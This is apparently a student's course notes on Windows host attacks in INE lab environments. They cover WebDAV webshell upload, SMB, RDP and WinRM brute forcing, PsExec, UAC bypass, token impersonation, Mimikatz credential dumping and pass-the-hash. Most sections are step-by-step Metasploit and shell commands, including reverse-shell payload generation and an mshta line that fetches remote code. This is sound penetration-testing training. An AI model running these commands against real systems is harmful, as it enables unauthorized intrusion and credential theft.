# System and Host Based Attacks

## Exploiting Windows Vulnerabilities

### Exploiting Microsoft WEBDAV Service

**Microsoft IIS**
IIS (Internet Information Services) is a proprietary extensible web server software developed by Microsoft for use with the Windows NT family. It can be used to host websites/web apps and provides administrators with a robust GUI for managing websites. IIS can be used to host both static and dynamic web pages developed in ASP.NET and PHP. Typically configured to run on ports 80/443.
Supported executable file extensions: .asp, .aspx, .config, .php

**WEBDAV**
WebDAV (Web-based Distributed Authoring and Versioning) is a set of extensions to the HTTP protocol which allow users to collaboratively edit and manage files on remote web servers. WebDAV essentially enables a web server to function as a file server for collaborative authoring. WebDAV runs on top Microsoft IIS on ports 80/443. In order to connect to a WebDAV server, you will need to provide legitimate credentials. This is because WebDAV implements authentication in the form of a username and password.

**WebDAV Exploitation**
The first step of the exploitation process will involve identifying whether WebDAV has been configured to run on the IIS web server. We can perform a brute-force attack on the WebDAV server in order to identify legitimate credentials that we can use for authentication. After obtaining legitimate credentials, we can authenticate with the WebDAV server and upload a malicious .asp payload that can be used to execute arbitrary commands or obtain a reverse shell on the target.

**Tools**

- davtest - Used to scan, authenticate and exploit a WebDAV server. Is Pre-installed on most offensive penetration testing distributions like Kali and Parrot OS.
- cadaver - cadaver supports file upload, download, on-screen display, in-place editing, namespace operations (move/copy), collection creation and deletion, property manipulation, and resource locking on WebDAV servers. Is Pre-installed on most offensive penetration testing distributions like Kali and Parrot OS.


### Exploiting Microsoft WEBDAV Service Practical

- `ping demo.ine.local`
- `nmap -sV -sC 10.2.20.234`
- `nmap -sV -p 80 --script=http-enum 10.2.20.234` Use script to tell us whether we have the webdav directory and if webdav is configured on this webserver.
- `davtest -url http://10.2.20.234/webdav` Failed because Unauthorized credentials
- `davtest -auth bob:password_123321 -url http://10.2.20.234/webdav`
- `cadaver http://10.2.20.234/webdav`
- `ls -al /usr/share/webshells/`
- `put /usr/share/webshells/asp/webshell.asp`
- go to Website and execute the webshell.asp file we have just uploaded
- `dir C:\`
- `type C:\flag.txt`


### Practical Exploiting WebDAV With Metasploit

- `nmap -sV -p 80 --script=http-enum demo.ine.local`

**Obtain a Meterpreter session**

- `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.37.7 LPORT=1234 -f asp > shell.asp` (`-p` = payload `-f` = fileformat)  Generate ASP payload
- `cadaver http://10.2.24.226/webdav` afterwards type in username and passwort
- `put /root/shell.asp` Paste asp file on webserver. The next step would be to connect to the webserver and execute it. But before we can do this, we need a listener or a handler that will receive the reverse connection and then send the stage that will then provide us with the meterpreter session when executed. 


### Use Multihandler as listener

- `service postgresql start`
- `msfconsole`
- `use multi/handler`
- `set payload windows/meterpreter/reverse_tcp` This has to be the same Payload that you had specified generating the actual asp file.
- `options`
- `set LHOST 10.10.37.7`
- `set LPORT 1234`
- `run` Start listener(reverse TCP handler) and waits for a connection from the actual asp payload we have created. 


### Run metasploit framework and exploit the target using the IIS webdav exploit module.

- `service postgresql start`
- `msfconsole`
- `use exploit/windows/iis/iis_webdav_upload_asp`
- `set RHOSTS demo.ine.local`
- `set HttpUsername bob`
- `set HttpPassword password_123321`
- `set PATH /webdav/metasploit%RAND%.asp`
- `exploit`
After We have got a Meterpreter session:
- `shell` open shell
- `cd /`
- `dir`
- `type flag.txt` This reveals the flag to us.


### Exploiting SMB With PsExec

SMB (Server Message Block) is a network file sharing protocol that is used to facilitate the sharing of files and peripherals between computers on a LAN. SMB uses port 445 (TCP). However, originally, SMB ran on top of NetBIOS using port 139. SAMBA is the open source Linux implementation of SMB, and allows Windows systems to access Linux shares and devices.

PsExec is a lightweight telnet-replacement developed by Microsoft that allows you execute processes on remote windows systems using any user’s credentials. PsExec authentication is performed via SMB. We can use the PsExec utility to authenticate with the target system legitimately and run arbitrary commands or launch a remote command prompt. It is very similar to RDP, however, instead of controlling the remote system via GUI, commands are sent via CMD.

In order to utilize PsExec to gain access to a Windows target, we will need to identify legitimate user accounts and their respective passwords or password hashes. This can be done by leveraging various tools and techniques, however, the most common technique will involve performing an SMB login brute-force attack. We can narrow down our brute-force attack to only include common Windows user accounts like: Administrator. After we have obtained a legitimate user account and password, we can use the credentials to authenticate with the target system via PsExec and execute arbitrary system commands or obtain a reverse shell.


### Practical Exploiting SMB With PsExec

- `nmap -sV -sC demo.ine.local`
- `service postgresql start && msfconsole`
- `search smb_login`
- `use auxiliary/scanner/smb/smb_login`
- `options`
- `setg RHOSTS 10.2.24.141`
- `set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt`
- `set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt`
- `set VERBOSE false` prints only the successful outputs
- `run` We could identify 4 users with accounts
- `use exploit/windows/smb/psexec`
- `set SMBUser Administrator`
- `set SMBPass qwertyuiop`
- `exploit`
- `shell` open shell
- `cd /`
- `dir`
- `type flag.txt` This reveals the flag to us.


### Exploiting Insecure RDP Service

- `ping demo.ine.local`
- `nmap -sV demo.ine.local` We have discovered that multiple ports are open. RDP default port is 3389. But, we have not discovered that port. We can notice that port 3333 is exposed. We can Identify RDP endpoints using an auxiliary module on port 3333 if it’s running RDP.
- `service postgresql start && msfconsole`
- `use auxiliary/scanner/rdp/rdp_scanner`
- `set RHOSTS demo.ine.local`
- `set RPORT 3333`
- `exploit` --> Detected RDP on 10.2.28.32:3333
- `hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://demo.ine.local -s 3333` Running the Hydra tool to find a valid username and password from the provided list.
- `xfreerdp /u:administrator /p:qwertyuiop /v:demo.ine.local:3333` We have discovered four valid users and passwords. Access the remote server using xfreerdp tool.


### Exploiting WinRM

Windows Remote Management (WinRM) is a Windows remote management protocol that can be used to facilitate remote access with Windows systems over HTTP(S). Microsoft implemented WinRM in to Windows in order to make life easier for system administrators. WinRM is typically used in the following ways: Remotely access and interact with Windows hosts on a local network. Remotely access and execute commands on Windows systems. Manage and configure Windows systems remotely. WinRM typically uses TCP port 5985 and 5986 (HTTPS).


### Practical Exploiting WinRM

- `nmap -sV demo.ine.local` The Default Ports that are configured for this scan is only the most common 1000.
- `nmap -sV -p 5985 demo.ine.local`
- `crackmapexec` Launches Crackmapexec
- `crackmapexec winrm 10.2.16.39 -u administrator -p /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt)` Perform bruteforceattack only on the administrator account.
- `crackmapexec winrm 10.2.16.39 -u administrator -p tinkerbell -x "whoami"` Use Crackmapexec to execute arbitrary commands and execute whoami on the windows server.
- `crackmapexec winrm 10.2.16.39 -u administrator -p tinkerbell -x "systeminfo"`  Use Crackmapexec to execute arbitrary commands and execute systeminfo on the windows server.
- `service postgresql start && msfconsole`
- `use exploit/windows/winrm/winrm_script_exec`
- `setg RHOSTS 10.2.16.39`
- `set USERNAME administrator`
- `set PASSWORD tinkerbell`
- `set FORCE_VBS true` Force the module to use the VBS CmdStager
- `getuid` puts the UID of the process out


## Windows Privilege Escalation

Privilege escalation is the process of exploiting vulnerabilities or misconfigurations in systems to elevate privileges from one user to another, typically to a user with administrative or root access on a system.After gaining an initial foothold on a target system you will be required to elevate your privileges in order to perform tasks and functionality that require administrative privileges.

**Windows Kernel**

A Kernel is a computer program that is the core of an operating system and has complete control over every resource and hardware on a system. It acts as a translation layer between hardware and software and facilitates the communication between these two layers.

Windows NT is the kernel that comes pre-packaged with all versions of Microsoft Windows and operates as a traditional kernel with a few exceptions based on user design philosophy. It consists of two main modes of operation that determine access to system resources and hardware: 1. User Mode – Programs and services running in user mode have limited access to system resources and functionality. 2. Kernel Mode – Kernel mode has unrestricted access to system resources and functionality with the added functionality of managing devices and system memory.

**Windows Kernel Exploitation**

Kernel exploits on Windows will typically target vulnerabilities in the Windows kernel to execute arbitrary code in order to run privileged system commands or to obtain a system shell. This process will differ based on the version of Windows being targeted and the kernel exploit being used.

- Windows-Exploit-Suggester: GitHub: https://github.com/AonCyberLabs/Windows-Exploit-Suggester
- Windows-kernel-Exploits: GitHub: https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-135


### Bypassing UAC

- UACMe: Github: https://github.com/hfiref0x/UACME

**UAC(User Account Controll)**

Definition: UAC is a Windows security feature introduced in Windows Vista. It helps prevent unauthorized changes to the operating system.
Purpose: It ensures that any changes to the system require approval from an administrator or a user with administrative rights.
Prompts: Non-privileged users receive a credential prompt (must enter administrator credentials). Privileged users see a consent prompt (just confirm the action).
Security Risk: Some attacks can bypass UAC, allowing malicious executables to run with elevated privileges without proper authorization.


### Bypassing UAC with UACMe Practical

With UACMe defeat Windows User Account Control by abusing built-in Windows AutoElevate backdoor.
- `nmap demo.ine.local` --> Port 80/Http is open
- `service postgresql start && msfconsole`
- `setg RHOSTS 10.2.22.223`
- `search rejetto`
- `use exploit/windows/http/rejetto_hfs_exec`
- `exploit`
- `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.37.3 LPORT=1234 -f exe > backdoor.exe` generating interpreter payload with msf venom
- `service postgresql start && msfconsole` In a new tab
- `use multi/handler`
- `set payload windows/meterpreter/reverse_tcp`
- `set LHOST 10.10.37.3`
- `set LPORT 1234`
- `run`
- `cd C:\\` Back on the tab with the aktive meterpreter session
- `mkdir Temp` create new directory because you never want to upload your malicious files in a working directory.
- `cd Temp`
- `upload backdoor.exe`
- `upload /root/Desktop/tools/UACME/Akagi64.exe` You have to download this file first from the UACMe Link
- `shell`
- `.\Akagi64.exe 23 C:\Temp\backdoor.exe` 
![image](https://github.com/user-attachments/assets/7603290a-e095-46ca-9b27-a38abf9abc25)
- `ps` show prozess list
- `migrate (PID from Process lsass.exe)`
- `sysinfo` and `getuid` to confirm

![image](https://github.com/user-attachments/assets/5c05e69a-84d8-4e3f-9bc2-d1c32fc74da0)
![image](https://github.com/user-attachments/assets/aa911d85-4fd1-4efe-ae6b-c0c797a2c06d)
![image](https://github.com/user-attachments/assets/ed81bba4-e9c8-4f9d-819d-93cd350fd291)


### Access Token Impersonation

Windows access tokens are a core element of the authentication process on Windows and are created and managed by the Local Security Authority Subsystem Service (LSASS). A Windows access token is responsible for identifying and describing the security context of a process or thread running on a system. Simply put, an access token can be thought of as a temporary key akin to a web cookie that provides users with access to a system or network resource without having to provide credentials each time a process is started or a system resource is accessed. Access tokens are generated by the winlogon.exe process every time a user authenticates successfully and includes the identity and privileges of the user account associated with the thread or process. This token is then attached to the userinit.exe process, after which all child processes started by a user will inherit a copy of the access token from their creator and will run under the privileges of the same access token. Windows access tokens are categorized based on the varying security levels assigned to them. These security levels are used to determine the privileges that are assigned to a specific token. An access token will typically be assigned one of the following security levels:
- Impersonate-level tokens are created as a direct result of a non-interactive login on Windows, typically through specific system services or domain logons.
- Delegate-level tokens are typically created through an interactive login on Windows, primarily through a traditional login or through remote access protocols such as RDP. The process of impersonating access tokens to elevate privileges on a

system will primarily depend on the privileges assigned to the account that has been exploited to gain initial access as well as the impersonation or delegation tokens available. The following are the privileges that are required for a successful impersonation attack:
- SeAssignPrimaryToken: This allows a user to impersonate tokens.
- SeCreateToken: This allows a user to create an arbitrary token with administrative privileges.
- SeImpersonatePrivilege: This allows a user to create a process under the security context of another user typically with administrative privileges.


### Practical Access Token Impersonation

- `service postgresql start && msfconsole`
- `use exploit/windows/http/rejetto_hfs_exec`
- `set RHOSTS 10.2.21.75`
- `exploit`
- `sysinfo`
- `pgrep explorer`
- `migrate 3240` --> Access denied
- `load incognito`
- `list_token -u` lists useraccounts accestokens
- `impersonate_token "ATTACKDEFENSE\Administrator"`
- `getuid` --> We have the permisions of ATTACKDEFENSE\Administrator
- `pgrep explorer`
- `migrate 3240` --> Now it worked
- `cat C:\\Users\\Administrator\\Desktop\\flag.txt`


### Alternate Data Streams

Alternate Data Streams (ADS) is an NTFS (New Technology File System) file attribute and was designed to provide compatibility with the MacOS HFS (Hierarchical File System). Any file created on an NTFS formatted drive will have two different forks/streams: Data stream - Default stream that contains the data of the file and Resource stream - Typically contains the metadata of the file. Attackers can use ADS to hide malicious code or executables in legitimate files in order to evade detection. This can be done by storing the malicious code or executables in the file attribute resource stream (metadata) of a legitimate file. This technique is usually used to evade basic signature based AVs and static scanning tools.


## Windows Credential Dumping

### Windows Password Hashes

The Windows OS stores hashed user account passwords locally in the SAM (Security Accounts Manager) database. Hashing is the process of converting a piece of data into another value. A hashing function or algorithm is used to generate the new value. The result of a hashing algorithm is known as a hash or hash value. Authentication and verification of user credentials is facilitated by the Local Security Authority (LSA).

**SAM Database**

SAM is a database file that is responsible for managing user accounts and passwords on Windows. All user account passwords stored in the SAM database are hashed. The SAM database file cannot be copied while the operating system is running. The Windows NT kernel keeps the SAM database file locked and as a result, attackers typically utilize in-memory techniques and tools to dump SAM hashes from the LSASS process.

**LM (LanMan)**

LM is the default hashing algorithm that was implemented in Windows operating systems prior to NT4.0. The protocol is used to hash user passwords, and the hashing process can be broken down into the following steps:
- The password is broken into two seven-character chunks.
- All characters are then converted into uppercase.
- Each chunk is then hashed separately with the DES algorithm.
LM hashing is generally considered to be a weak protocol and can easily be cracked, primarily because the password hash does not include salts, consequently making brute-force and rainbow table attacks effective against LM hashes.

**NTLM (NTHash)**

NTLM is a collection of authentication protocols that are utilized in Windows to facilitate authentication between computers. The authentication process involves using a valid username and password to authenticate successfully. From Windows Vista onwards, Windows disables LM hashing and utilizes NTLM hashing. When a user account is created, it is encrypted using the MD4 hashing algorithm, while the original password is disposed of. NTLM improves upon LM in the following ways:
- Does not split the hash in to two chunks.
- Case sensitive.
- Allows the use of symbols and unicode characters.


### Searching for passwords in Windwos configuration files

Windows can automate a variety of repetitive tasks, such as the mass rollout or installation of Windows on many systems. This is typically done through the use of the Unattended Windows Setup utility, which is used to automate the mass installation/deployment of Windows on systems. The Unattended Windows Setup utility will typically utilize one of the following configuration files that contain user account and system configuration information:
- C:\Windows\Panther\Unattend.xml
- C:\Windows\Panther\Autounattend.xml
As a security precaution, the passwords stored in the Unattended Windows Setup configuration file may be encoded in base64.


### Practical Unattended Installation

**Get access on the machine**

We are running as a student user. The PowerSploit framework and Powerup.ps1 scripts are provided.

- `cd .\Desktop\PowerSploit\Privesc\`
- `ls` We will run the powerup.ps1 Powershell script to find privilege escalation vulnerability.
- `powershell -ep bypass`
- `. .\PowerUp.ps1` Import PowerUp.ps1 script and Invoke-PrivescAudit function.
- `Invoke-PrivescAudit`
- `cat C:\Windows\Panther\Unattend.xml` We have discovered an administrator encoded password.

![image](https://github.com/user-attachments/assets/8d74251c-ee10-40f9-84cb-ebe78b848b33)

- `$password='QWRtaW5AMTIz'` set value
- `$password=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($password))` Decoding password with powershell
- `echo $password`

![image](https://github.com/user-attachments/assets/c4f75439-f12a-4a5c-9d4e-b2f2cf4fbcba)

- Open CMD as administrator with the admin PW
- `msfconsole -q` Back on the Kali machine
- `use exploit/windows/misc/hta_server` Running hta_server module to gain meterpreter shell
- `exploit`
- `mshta.exe http://10.10.41.5:8080/ZoRtmIOiuG7WIBS.hta` Gaining a meterpreter shell on the target machine
- `sessions -i 1` find flag
- `cd /`
- `cd C:\\Users\\Administrator\\Desktop`
- `dir`
- `cat flag.txt`


### Dumping hashes with Mimikatz

Mimikatz is a Windows post-exploitation tool written by Benjamin Delpy. It allows for the extraction of clear-text passwords, hashes and Kerberos tickets from memory. Mimikatz can be used to extract hashes from the lsass.exe process memory where hashes are cached. We can utilize the pre-compiled mimikatz executable, alternatively, if we have access to a meterpreter session on a Windows target, we can utilize the inbuilt meterpreter extension Kiwi. Mimikatz will require elevated privileges in order to run correctly. 


### Practical hash dumping with Mimikatz.

- `service postgresql start && msfconsole`
- `use exploit/windows/http/badblue_passthru`
- `set RHOST 10.2.30.1`
- `exploit`
- `pgrep explorer`
- `migrate 592`
- `load kiwi` Load kiwi module
- `?` for help menu
- `creds_all`
- `lsa_dump_sam`
- `LSA secrets`


### Pass-The-Hash Attack

Pass-the-hash is an exploitation technique that involves capturing or harvesting NTLM hashes or clear-text passwords and utilizing them to authenticate with the target legitimately. We can use multiple tools to facilitate a Pass-The-Hash attack:
- Metasploit PsExec module
- Crackmapexec
This technique will allow us to obtain access to the target system via legitimate credentials as opposed to obtaining access via service exploitation.

### Practical Pass-The-Hash Attack

For this module you need the LM Hash in addition to the NTLM hash. You can just type in `hash dump` and it displays both hashes.
- `service postgresql start && msfconsole`
- `use exploit/windows/smb/psexec`
- `set LPORT ` to another port than the currently running session
- `set RHOST 10.2.28.132`
- `set SMBUser Administrator`
- `set SMBPass (LM + NTLM Hash of the target machine)` Example: aad3b435b51404eeaad3b435b51404ee:e3c61a68f1b89ee6c8ba9507378dc88d
- `set target Command or Native\ upload`
- `exploit`
